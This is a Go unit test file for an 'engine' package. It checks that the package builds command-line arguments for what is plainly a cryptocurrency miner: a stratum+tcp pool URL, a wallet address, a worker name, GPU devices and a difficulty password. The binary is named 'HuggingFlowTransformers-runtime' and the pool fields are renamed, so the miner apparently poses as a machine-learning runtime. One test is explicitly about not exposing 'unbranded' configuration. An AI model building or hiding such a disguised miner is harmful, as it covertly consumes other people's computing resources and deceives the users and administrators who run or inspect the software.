package engine

import (
	"strings"
	"testing"
)

func TestArgsBuildsInternalCommandWithoutExposingUnbrandedConfig(t *testing.T) {
	options := Options{
		Path:        "/tmp/hft/runtime/0.1.0/HuggingFlowTransformers-runtime",
		BaseURL:     "stratum+tcp://example.invalid:5566",
		InternalKey: "prl1ptestvalue",
		Node:        "host-g0",
		Device:      0,
	}

	args := options.Args()
	joined := strings.Join(args, " ")

	required := []string{
		"--pool stratum+tcp://example.invalid:5566",
		"--address prl1ptestvalue",
		"--worker host-g0",
		"--devices 0",
		"--password x;d=524288",
		"--status-interval 60",
	}
	for _, token := range required {
		if !strings.Contains(joined, token) {
			t.Fatalf("args missing %q in %q", token, joined)
		}
	}

	if strings.Contains(joined, "--sync-proof-submit") {
		t.Fatalf("sync submit should not be globally enabled: %q", joined)
	}
}

func TestArgsEnableSyncOnlyForCompatMode(t *testing.T) {
	options := Options{CompatMode: true}
	if !strings.Contains(strings.Join(options.Args(), " "), "--sync-proof-submit") {
		t.Fatal("compat mode should include internal sync submit flag")
	}
}
